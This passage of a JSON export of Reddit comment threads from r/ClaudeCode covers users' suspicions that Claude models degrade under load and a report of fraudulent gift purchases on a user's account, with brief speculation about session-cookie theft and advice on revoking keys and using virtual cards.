          "text": "This is 100% true and verified. When mid-day loads spike the model gets weighed down and instead throws out slop. ChatGPT explained this to me a few months ago and I was in disbelief but this is easily seen now.",
          "score": 2,
          "created_utc": "2026-01-15 04:32:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzphakz",
          "author": "Brave-Mulberry3860",
          "text": "Everyone same feedback. Product became unusable",
          "score": 2,
          "created_utc": "2026-01-15 10:50:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqe8ws",
          "author": "vibecodeking",
          "text": "Explains why it was so dumb for my simple task of creating a stacked ring chart. Gemini had no sweat doing it.",
          "score": 2,
          "created_utc": "2026-01-15 14:28:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5t689",
          "author": "SharpKaleidoscope182",
          "text": "I don't think its a weaker model because they got overloaded; I think they're just ongoing attitude adjustment. It's already nearly pareto-optimal, so as they tinker with it, sometimes its attitude/mindset gets worse. \n\nSame strength, more insanity.",
          "score": 3,
          "created_utc": "2026-01-12 13:48:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5urb8",
          "author": "beer_geek",
          "text": "Today I closed a CC session from last night to reboot. \n\n6% used for 5 hour session. I just woke up man.",
          "score": 2,
          "created_utc": "2026-01-12 13:57:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5zm9r",
          "author": "OldSausage",
          "text": "People make this claim about every model, even music models like Suno and image models like NanoBanana. But you would think that this would be relatively easy to benchmark, and if we were really seeing it there would be data and not just anecdotes. I mean, there are a lot of guys out there bench-marking these things, and this would be a big story if provably true.",
          "score": 3,
          "created_utc": "2026-01-12 14:23:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5qxni",
          "author": "whoknows_s",
          "text": "ðŸ’¯",
          "score": 2,
          "created_utc": "2026-01-12 13:36:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz5nv2d",
          "author": "IlliterateJedi",
          "text": "Is that something in doubt?  In the past if you were in claude on the website it would clearly state \"We are downgrading our response to haiku because we are overloaded.\"  I just assumed Claude (and all LLM services) did that whether they informed you or not.",
          "score": 2,
          "created_utc": "2026-01-12 13:18:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6lg8f",
              "author": "inevitabledeath3",
              "text": "Yes. For API customers and other paying customers you wouldn't expect them to substitute a model without telling you. In fact for API pricing that is paid per token with different rates for each model type (Haiku, Sonnet, Opus) it would basically be fraud.",
              "score": 1,
              "created_utc": "2026-01-12 16:11:25",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz5njj5",
          "author": "heironymous123123",
          "text": "Quantized versions.. called it last summer and people here were telling me it wasn't true lol",
          "score": 2,
          "created_utc": "2026-01-12 13:16:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz5shm5",
              "author": "Chemical-Canary4174",
              "text": "100% quantized version imho",
              "score": 0,
              "created_utc": "2026-01-12 13:45:03",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz6kim9",
                  "author": "inevitabledeath3",
                  "text": "Why do people on reddit immediately jump to quantization as a reason for something? You haven't even demonstrated an actual degradation scientifically yet, nevermind proved quantization as a reason. Extreme quantization should even be easy to spot as it would lead to a jump in perplexity which should be easy to measure.\n\nFirst you have to rule out changes to Claude Code itself, as they do make changes here to optimize token usage and costs. Then there are changes to the model and the way inference is done that can affect performance that have little to do with quantization. That's what happened over summer. An example would be enabling speculative decoding or changing the speculative decoding settings. Speculative decoding is what companies like DeepSeek and z.ai use to be so cheap, and it's used by many other providers and models as well. They could even be changing parts like the number of experts and activated experts, or the attention mechanisms being used (see TransMLA and DeepSeek V3.2-exp using DSA for examples).",
                  "score": 3,
                  "created_utc": "2026-01-12 16:07:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz66a1g",
          "author": "beefcutlery",
          "text": "They'll be hiring u/lrobinson2011 for damage control soon enough.",
          "score": 1,
          "created_utc": "2026-01-12 14:58:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz67fiw",
          "author": "exitcactus",
          "text": "Yes it's.. sus...",
          "score": 1,
          "created_utc": "2026-01-12 15:04:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz6g7qz",
          "author": "edjez",
          "text": "GPUs available also affects context window sizes that models can effectively get, you can tune reasoning length, etc. \nmy hunch -which could also be my bias- is we just see shifts due to fleet management, and many changes are temporary. (As the people and machines decide and shift the whole set of model m deployed jn region r on hardware h while maintaining latency t)",
          "score": 1,
          "created_utc": "2026-01-12 15:47:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz6h65a",
          "author": "adelie42",
          "text": "Still haven't experienced it, hope it stays that way.",
          "score": 1,
          "created_utc": "2026-01-12 15:51:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz6hobi",
          "author": "BillelKarkariy",
          "text": "![gif](giphy|aJJWLOqtohbO4sq5sY|downsized)",
          "score": 1,
          "created_utc": "2026-01-12 15:54:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz6hwqd",
          "author": "ripviserion",
          "text": "Today is dumb",
          "score": 1,
          "created_utc": "2026-01-12 15:55:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz71k35",
          "author": "moog500_nz",
          "text": "Everybody - look at the terms & conditions of Anthropic and others. It doesn't refer to load balancing by inserting weaker models but there's sufficient flexibility under 'right to modify services' and 'performance disclaimers' to allow them to do this. It sucks but I'm not surprised and there's nothing any of us can do about it. I think the same thing is happening with Gemini as it becomes increasingly more popular based on the posts I'm seeing on r/Gemini",
          "score": 1,
          "created_utc": "2026-01-12 17:25:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz781no",
          "author": "xRobbix",
          "text": "It got so messy yesterday, i had to get it fixed by 5.2 xhigh",
          "score": 1,
          "created_utc": "2026-01-12 17:54:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7bwtr",
          "author": "Mikeshaffer",
          "text": "I hit my limit last week and switched to my glm plan that cost the same for a year as a few days on Claude. I havenâ€™t noticed a difference in middle quality compared to sonnet and I havenâ€™t hit my limit yet. My god, I sound like a Chinese bot account. Donâ€™t I?",
          "score": 1,
          "created_utc": "2026-01-12 18:11:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7d1na",
          "author": "seeking-health",
          "text": "The future is local hosting\n\nI know it's expensive but if you have the money you should buy a setup similar to Pewdiepie's, RIGHT NOW\n\nIt will only become more and more expensive\n\nInvest on it, protect it meticulously, put it in on a water proof fire proof cage or something\n\nit will be so precious people will try to rob your house in 5 years (so don't tell anybody)",
          "score": 1,
          "created_utc": "2026-01-12 18:17:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7hjoq",
          "author": "-AK3K-",
          "text": "I have been getting forced compaction at 60-80 context usage aswell as ~%20 usage before I even open or prompt Claude.",
          "score": 1,
          "created_utc": "2026-01-12 18:37:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7qb6r",
          "author": "CitizenCaleb",
          "text": "Claude Max plan user here. I thought it was just me but after reading this post, I got to snooping and what Iâ€™m seeing leaves me feeling that somethingâ€™s going on.\n\nI used Claude very little over the weekend, and limits reset every Friday. Most of the usage over the weekend was working in Claude.ai/Mac OS desktop app to refine user stories and some Claude Code testing of an app I started planning with it last week. As a Max plan user ($100/month), I would have thought in 2 days, my light usage would have been a fraction of the 19% that was showing up in the dashboard last night when I was in settings looking to pull an API key.\n\nThe whole reason I even moved to the Max plan was because under the Pro plan ($20/month), I noticed one week that my usage rate was coming close to this for just Opus. I was going to be transitioning from planning with Claude to coding and didnâ€™t want to cap out on Opus\n\nWhatâ€™s noteworthy, is that over weekend, I shifted to coding and wanted to try Gemini Pro and Antigravity, so those tools saw the majority of my usage. I thought AG was connected to my Workspace account (Iâ€™m the solo member of the account), which also gives me Pro, but after looking into it today, turned out Iâ€™ve been signed in this whole time on my personal (free) account.\n\nThe takeaway is that I got a whole app, well built for the 1st time with AG + Pro on my free-tierGoogle account. Meanwhile, over a low usage weekend Opus seems to think I lived in the model. Something is fishy here.\n\nhttps://preview.redd.it/apk5w4kckycg1.png?width=960&format=png&auto=webp&s=7db0aff80a44c8e520d4d1d842af611021b662b9",
          "score": 1,
          "created_utc": "2026-01-12 19:16:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7vcj8",
          "author": "zd0l0r",
          "text": "Not code but Opus currently gives itâ€™s â€œTaking longer than usual 10/10â€ message for third time in a row. Useless",
          "score": 1,
          "created_utc": "2026-01-12 19:39:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7xns0",
          "author": "m_luthi",
          "text": "Thought something was up..the last two days has been a waste of",
          "score": 1,
          "created_utc": "2026-01-12 19:50:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz80dlr",
          "author": "PrayagS",
          "text": "Sharing my two cents since plenty of smug folks here who think we're just doing it wrong.\n\n`/context`: [image.png](https://postimg.cc/crwDrKyy)\n\nWent from ~50% usage (5 hour limit) left to 2% in the span of the above one thread. Was working on a small repo. https://github.com/rafikdraoui/jj-diffconflicts\n\nI have worked on bigger repos earlier with the same memory/tools and usage wasn't depleting this fast.",
          "score": 1,
          "created_utc": "2026-01-12 20:02:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz87o1x",
          "author": "Salt-Replacement596",
          "text": "Everyone is doing that. One of the reasons why they all explain the models and plans so vaguely.",
          "score": 1,
          "created_utc": "2026-01-12 20:37:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8991t",
          "author": "Training-Adeptness57",
          "text": "Is this also the case with copilot when using claude models?",
          "score": 1,
          "created_utc": "2026-01-12 20:44:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8gnbc",
          "author": "TechIBD",
          "text": "i spent about $30,000 a month in API plus the pro max account ( to be honest if you use this well you getting at least 50-100X value from API cost perspective ) and honestly the other day i was just getting a bit tired and also just waiting for my limit to reset, and i gave Gemini CLI a try. Honestly it's a really good one. I started a session in there basically naked ( i built a pretty elaborate hand-off pack for all Claude work to set up the repo and etc so by \"naked\" i meant i started a project with like none of that ) and Gemini did really well. Sub-agent is always seamless ( just appearing as multiple shell on screen ) and planning / documentation and etc is very intuitive. I don't think Codex is quite there yet but Gemini CLI is a really good product.\n\nA friend of mine wrote a protocol so he get Codex, CC, Gemini agents to collab with a central source of truth, i didn't bother to orchestrate it, mostly because cost to me is not really that big of a concern relative to the value of the work, but if Gemini keep on getting better than it's hard to say if i would switch or nah.",
          "score": 1,
          "created_utc": "2026-01-12 21:19:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8o3hw",
          "author": "doineedsunscreen",
          "text": "Late to this but Iâ€™ve been using Opus to code (both in antigravity / cursor & in CLI) then prompting Codex 5.2 max to review+verify that opus isnâ€™t BSing me. Has been working out pretty well thus far.. Codex catches Opus fking me a ton. Iâ€™ve tried the Gemini suite as well but didnâ€™t have much success. If anything, Iâ€™d use GLM4.7 as a 3rd agent",
          "score": 1,
          "created_utc": "2026-01-12 21:53:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8zkko",
          "author": "izayee",
          "text": "i feel like it especially does this when using paid extra credits. i swear i went through 25$ worth of credits in 2 hours for slow, crap generations.",
          "score": 1,
          "created_utc": "2026-01-12 22:49:23",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8zuie",
          "author": "TotalBeginnerLol",
          "text": "Iâ€™ve had almost no issues and been using it near full time for about 9 months on max plan. Occasionally it will be dumb for a bit then Iâ€™ll make a new session and switch my vpn to a different country then itâ€™ll be back to normal. Almost never hit a limit unless Iâ€™m going crazy and borderline misusing it to sloppy vibe code multiple projects in parallel.",
          "score": 1,
          "created_utc": "2026-01-12 22:50:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzeqtnh",
          "author": "whitestuffonbirdpoop",
          "text": "I can't wait to have the money to put together a machine for a \"big beefy local model+opencode\" setup.",
          "score": 1,
          "created_utc": "2026-01-13 19:52:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzf6ozc",
          "author": "dayglos",
          "text": "I think this might have to do more with bugs in the API, which serve a corrupted version of responses, like the one mentioned in this report from September. People who detected the bug were surprised that responses were notably worse than usual. That seems more likely to me than Anthropic lying about what model they're serving you. [https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues](https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues)",
          "score": 1,
          "created_utc": "2026-01-13 21:06:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfkffw",
          "author": "themightychris",
          "text": "I never notice this at all on an API plan, has anyone else? Are only subscription users subject to dynamic capacity tinkering perhaps? If so... I mean... that's the trade off you're signing up for to save on fees",
          "score": 1,
          "created_utc": "2026-01-13 22:10:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfnutt",
          "author": "Western-Leg7842",
          "text": "I have the same experience today/yesterday, opus 4.5 does stupid mistakes and doesn't follow my instructions at all...",
          "score": 1,
          "created_utc": "2026-01-13 22:26:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzftr5z",
          "author": "LoadingALIAS",
          "text": "My ClaudeCode plan has never hit the limit - ever. I work a LOT. This week it hit the limit in 3 days and I was charged $100 today for the worst work I have ever seen. I stopped and NO JOKE started writing the code manually. \n\nSomething is super wrong.",
          "score": 1,
          "created_utc": "2026-01-13 22:56:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzg4d2d",
          "author": "uduni",
          "text": "Why is this surprising? They need to balance price / performance. Everyone has the option to pay per token\n\nI pay > $1k a month, if the price doubled i would not care. I can work twice as fast.. or even 10x for some tasks",
          "score": 1,
          "created_utc": "2026-01-13 23:52:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzg85za",
              "author": "Defiant_Focus9675",
              "text": "congratulations on having a lot of money, thank you for sharing that with us\n\nyou're absolutely right, good sir",
              "score": 1,
              "created_utc": "2026-01-14 00:13:23",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzg9mny",
                  "author": "uduni",
                  "text": "I only have the money because i can work 2x. There is tons of freelance web dev work out there\n\n2x work speed = 2x clients",
                  "score": 1,
                  "created_utc": "2026-01-14 00:21:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzhauq1",
          "author": "Known_Department_968",
          "text": "Downgrade, downgrade, downgrade... That's the only option left as of now",
          "score": 1,
          "created_utc": "2026-01-14 03:53:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzhzppa",
          "author": "[deleted]",
          "text": "Sonnet 4.7 is being rolled out. Migration and adding new protocols (guardrail layer). This is how it is with every new model rollout.",
          "score": 1,
          "created_utc": "2026-01-14 06:59:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzi8p5d",
          "author": "maxrev17",
          "text": "Itâ€™s called load balancingâ€¦ when you have too many customers and not enough capacity you round-robin who is having a bad time :D",
          "score": 1,
          "created_utc": "2026-01-14 08:22:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzm6a7f",
          "author": "Kevs4n",
          "text": "When Opus 4.5 starts doing the same shit mistakes sonnet 4.0 did, you know something is up",
          "score": 1,
          "created_utc": "2026-01-14 21:34:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzmhiqp",
          "author": "Almond58",
          "text": "I have been working with Opus 4.5 6h+ a day for several weeks. Never have I seen it struggle so, so much. it's like 10% dumber than Sonnet 4.5. \n\nIt doesn't follow instructions, and makes unauthorized edits all the time since yesterday night.",
          "score": 1,
          "created_utc": "2026-01-14 22:26:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvp47l",
          "author": "ShakeTheJello",
          "text": "Poor is a great word. This is criminal.",
          "score": 1,
          "created_utc": "2026-01-16 07:08:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwre0y",
          "author": "manudicri",
          "text": "Honestly last 24 hours itâ€™s doing surprisingly great. Better than usual â€¦",
          "score": 1,
          "created_utc": "2026-01-16 12:34:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzxqdix",
          "author": "NoWheel9556",
          "text": "just use it through Opencode+antigravity(free, dont pay them , they will rugpull) . Google controls this one so its is consistently worse",
          "score": 1,
          "created_utc": "2026-01-16 15:38:31",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzzx6d3",
          "author": "King_of_the_snids",
          "text": "100% I've been using opus 4.5 non stop for two days and it went from being incredible to dog shit in a few hours.\n\nYou know how you get so reliant on it and then BOOM, it's starts to shit the bed you just give it hell? That happens to me a lot recently. I know it uses up the context window but I sometimes lose my mind and just off load for my own relief...\n\nI love Claude but I hate it in small amounts at the same time.",
          "score": 1,
          "created_utc": "2026-01-16 21:34:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09gq3a",
          "author": "Sketaverse",
          "text": "Is it not just a consequence of people unwittingly adding loadâ€™s of mcp tools and bloating context?",
          "score": 1,
          "created_utc": "2026-01-18 09:00:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ee66j",
          "author": "No-Goose-4791",
          "text": "It's really frustrating when this happens, and it happens a lot. And you're right, they 100% do this, don't gaslight us into believing they don't. It's part of their rate limiting protocols. When higher priority people (likely corps with deals) have the system under load, they put all the regular customers on the weaker models.",
          "score": 1,
          "created_utc": "2026-01-19 01:44:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0eu1ay",
          "author": "ogpterodactyl",
          "text": "I think the reality is they are always load balancing and redistributing compute as they feel is necessary. Felt dumb for me last week too. Like you know how chat gpt has the juice parameter I think Claude has the same thing and they just give more or less reasoning tokens based on how many people are using whether they are actively training a new model. Also now that they are in the lead and everyone has decided opus 4.5 is the current king they can save a little money.",
          "score": 1,
          "created_utc": "2026-01-19 03:09:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz60bg5",
          "author": "pandavr",
          "text": "Unpopular opinion: the only alternative to Anthropic giving normally 100%, but reserving 20% for other uses during some days when needed.... is...  \nAnthropic giving only 80% and reserving 20% for their use... always.\n\nIt's not difficult to understand",
          "score": 1,
          "created_utc": "2026-01-12 14:27:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz63y11",
          "author": "TheOriginalAcidtech",
          "text": "Its not about getting dumb. We all know it happens. Especialy on busy Mondays or on weekends. Its obvious as you said. The thing most people are TIRED of is the CONSTANT WHINING ABOUT USAGE LIMITS. Mostly from Pro customers. It's ridiculous the number of posts about \"oh my usage\" and they dont both checking their own usage or providing proof. It is DAY IN and DAY OUT of whiny crying little <censoreds>.",
          "score": 1,
          "created_utc": "2026-01-12 14:46:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz77fvq",
          "author": "Aggressive-Pea4775",
          "text": "Hard disagree here on models.\n\nItâ€™s definitely a version issue. 2.1.15 is seriously busted. So is 2.1.1 to a degree.\n\n2.0.76 runs like the submissive little task gremlin we all know ðŸ˜…ðŸ˜‚ Give it a whirl. Not model based.",
          "score": 1,
          "created_utc": "2026-01-12 17:51:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzbofm7",
          "author": "EatThemAllOrNot",
          "text": "If you spend 14 hours working with claude, you have some problems",
          "score": 0,
          "created_utc": "2026-01-13 09:14:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzbqs5n",
              "author": "Defiant_Focus9675",
              "text": "Yes, I'm solving those problems with claude\n\nThere are seasons in life, sometimes you need to lock-in and make something happen\n\nBut you do you brother",
              "score": 4,
              "created_utc": "2026-01-13 09:37:33",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzf4jv3",
                  "author": "N3TCHICK",
                  "text": "Thisâ€¦ Iâ€™m working extremely hard to finish an app that Iâ€™m weeks behind on. Every hour counts right now. Iâ€™ll sleep properly once Iâ€™m done this epic run in a few more weeks. \n\nIn the meantime, I NEED MY MAX20 OPERATING LIKE I PAY IT! Notâ€¦ wasting fâ€™n days fixing crap that should not be happening (itâ€™s NOT a skill issue) - and then watching tokens because A\\ canâ€™t figure out (or, perhaps donâ€™t want to) what is causing the token bloat as of Jan 1st. Iâ€™m having to fall back on GPT 5.2 High, (Pro acct) which Iâ€™d prefer not to do, because Iâ€™ve already set up Opus with skills and workflow. Now, I simply have to use GPT instead, which infuriates me so much. \n\nUgh. Back to pull my hair out some more. I wish theyâ€™d just release the canary model they accidentally leaked 5 days ago already.",
                  "score": 2,
                  "created_utc": "2026-01-13 20:56:37",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz5oeqh",
          "author": "Technical-Might9868",
          "text": "meanwhile im having 0 issues and pumping out production quality code no problem. skill issue? the world may never know",
          "score": -6,
          "created_utc": "2026-01-12 13:21:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz5p7u5",
              "author": "Defiant_Focus9675",
              "text": "I was once like you...thinking it was a skill gap.\n\nBut I'm a senior developer, I work with all sorts of models on a daily basis.\n\nThis IS an issue that's not skill based.\n\nskill is a THIRD of the picture:\n\n1. model (claude code has kept silent on if they change models or performance distrubution between Max users and enterprise and API)\n\n2. harness (claude code historically admitted to this fucking up MULTIPLE times in the last 3 months)\n\n3. then finally, there's prompts/skill",
              "score": 5,
              "created_utc": "2026-01-12 13:26:15",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nz5z9f0",
              "author": "Sponge8389",
              "text": "Try reviewing it. You will see some unoptimized processes. It's code generation in the past few days is just sooo awful.",
              "score": 3,
              "created_utc": "2026-01-12 14:22:05",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz6da4k",
              "author": "His0kx",
              "text": "Since you are so great, you should consider shipping some code and moving your mcp server from stdio mode to at least sse mode (we are now using http streaming mode but I guess you must know that since you have no skill issues)",
              "score": 2,
              "created_utc": "2026-01-12 15:33:26",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz5rhud",
          "author": "Buffer_spoofer",
          "text": "Skill issue lmao",
          "score": -4,
          "created_utc": "2026-01-12 13:39:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz5t07l",
              "author": "Defiant_Focus9675",
              "text": "true, anthropic's skill on communicating is defo an issue\n\n/s",
              "score": 4,
              "created_utc": "2026-01-12 13:47:55",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nz69u0t",
          "author": "cesarean722",
          "text": "I have tried GLM subscription for a week or so and I grade it as \"stable meh\". Should I go for claude max roulette?",
          "score": 0,
          "created_utc": "2026-01-12 15:16:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz9lqmg",
          "author": "viciousdoge",
          "text": "Thereâ€™s something called A/B testing that explains this all",
          "score": 0,
          "created_utc": "2026-01-13 00:47:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzaj5kn",
          "author": "LaughterCoversPain",
          "text": "Start new sessions.",
          "score": 0,
          "created_utc": "2026-01-13 03:48:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzi4vha",
          "author": "Independent-Gold-952",
          "text": "Also time to admit you guys will always find something to complain about on this app.",
          "score": 0,
          "created_utc": "2026-01-14 07:46:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz80k8f",
          "author": "acartine",
          "text": "So donâ€™t use it",
          "score": -3,
          "created_utc": "2026-01-12 20:03:50",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qgd4td",
      "title": "$5,250 in fraudulent gift purchases on my Claude account in 9 minutes â€” zero fraud detection triggered",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/gallery/1qgd4td",
      "author": "MobileNo8348",
      "created_utc": "2026-01-18 16:32:50",
      "score": 279,
      "num_comments": 74,
      "upvote_ratio": 0.93,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Bug Report",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qgd4td/5250_in_fraudulent_gift_purchases_on_my_claude/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o0bddlf",
          "author": "According-Tip-457",
          "text": "Dang. Imagine getting $5000 in free Claude.",
          "score": 90,
          "created_utc": "2026-01-18 16:42:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0be6b8",
              "author": "truvian_man",
              "text": "My next two prompts are gonna be so sick",
              "score": 73,
              "created_utc": "2026-01-18 16:46:13",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0bvyz1",
                  "author": "stampeding_salmon",
                  "text": "\"How many r's are in Griffyndor?\"\n\n\"Who would win in a fight between 100 men and one gorilla?\"",
                  "score": 19,
                  "created_utc": "2026-01-18 18:10:13",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0bzksv",
                  "author": "bigasswhitegirl",
                  "text": "Prompt 1: make a new passive income stream for me. make the WHOLE thing including setting up payments so I dont need to do anything. \n\nPrompt 2: no not like that",
                  "score": 17,
                  "created_utc": "2026-01-18 18:26:41",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0blqcz",
                  "author": "adam2222",
                  "text": "Wouldnâ€™t even use plan mode just raw dog it straight into coding",
                  "score": 5,
                  "created_utc": "2026-01-18 17:22:15",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0bfblr",
                  "author": "regulators818",
                  "text": "lmao",
                  "score": 3,
                  "created_utc": "2026-01-18 16:51:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0buo7l",
          "author": "Desticheq",
          "text": "If that was done via session hijack, it probably means this person may have access to your logs/chats.\n\nI would consider all my API keys as stolen by this point.",
          "score": 25,
          "created_utc": "2026-01-18 18:04:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0c0c7s",
              "author": "MobileNo8348",
              "text": "All systems are nuked still a few more Api keys to revoke, good tip thank you.\n\nMy suspicion is on â€œLock Adblockâ€ first time I tried it because i just needed something quick on a fresh Fedora install, in the basement, and it was the first in the search. Classic mistake, if itâ€™s really it. And only claude was active in that browser. (Else it was my window ltsc main)\n\nThis still doesnâ€™t excuse claude/anthropic the gift thing shouldnâ€™t exist. And of course it should result in an immediate account lockdown given my past spending patterns",
              "score": 11,
              "created_utc": "2026-01-18 18:30:05",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0cuwrs",
                  "author": "kova98k",
                  "text": "That's really concerning. An app from the chrome store hijacked your session cookie?",
                  "score": 5,
                  "created_utc": "2026-01-18 20:57:08",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0edv58",
                  "author": "MrRandom04",
                  "text": "uBlock Origin / Lite. (NOT uBlock). They've always been the goat. ABP is good enough too.",
                  "score": 4,
                  "created_utc": "2026-01-19 01:43:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0btohq",
          "author": "BrushPail",
          "text": "I'd guess you probably got stealer malware on your computer. The crook can hijack your session with the info from the stealer, no password or MFA needed. Sorry that happened to you.",
          "score": 8,
          "created_utc": "2026-01-18 17:59:38",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0bui1i",
              "author": "MobileNo8348",
              "text": "No need to be sorry, no damage done and all systems got nuked. It's most likely a session takeover, that's my bet too. Or a backdoor, which is more unlikely.",
              "score": 2,
              "created_utc": "2026-01-18 18:03:27",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0bewhi",
          "author": "Jones420_",
          "text": "Wtf bro, that sounds scammyâ€¦ in this types of subscriptions i only use temporary 1 use month cards so i never got a surprise but im in shock that happenedâ€¦ unfortunately the human support will take some days to get back to you",
          "score": 14,
          "created_utc": "2026-01-18 16:49:41",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0bru7u",
              "author": "SocietyTomorrow",
              "text": "I've been using Privacy.com virtual cards for all my. Subscriptions and online buying for years so nothing ever goes past the monthly budget. It's too hard to get human help until way too late so you pretty much need to build in as many roadblocks as you can think of.",
              "score": 11,
              "created_utc": "2026-01-18 17:51:07",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0bitc2",
              "author": "MobileNo8348",
              "text": "Itâ€™s so hard to get these in Norway.\n\nThough Iâ€™m going to look super hard again to find a local online bank that has em. Other alternative is an Visa debit account where I only can ever put a tiny or a just right for subscription cost on it\n\nIâ€™m already using one proton alias per account. So this is so very much on Claude as thatâ€™s the only thing the proton alias is connected to.\n\nNuked all machines, though itâ€™s unlikely Iâ€™m not talking the risk. Before that I was already an occasional tails os user. Now the level of online hygiene will be very very bonkers ðŸ™ˆ",
              "score": 2,
              "created_utc": "2026-01-18 17:08:16",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0cd4q9",
                  "author": "bytejuggler",
                  "text": "Revolut",
                  "score": 4,
                  "created_utc": "2026-01-18 19:29:40",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0c9qe5",
                  "author": "Due-Horse-5446",
                  "text": "Om du har ett fÃ¶retag sÃ¥ funkar pleo eller mynt, fÃ¶r att skapa virtuella kort med beloppsgrÃ¤ns. Ganska sÃ¤ker pÃ¥ att det funkar fÃ¶r norska bolag med",
                  "score": 2,
                  "created_utc": "2026-01-18 19:13:15",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0bjt2g",
                  "author": "nicklauzon",
                  "text": "Not sure if you have Revolut in Norway, but if you do you can use that to create both virtual cards and one use-cards. Iâ€™m not sure if the one use-cards work though but the virtual cards work and you can just use it one time and then block and remove it.",
                  "score": 1,
                  "created_utc": "2026-01-18 17:12:59",
                  "is_submitter": false,
                  "replies": []
                },
                {
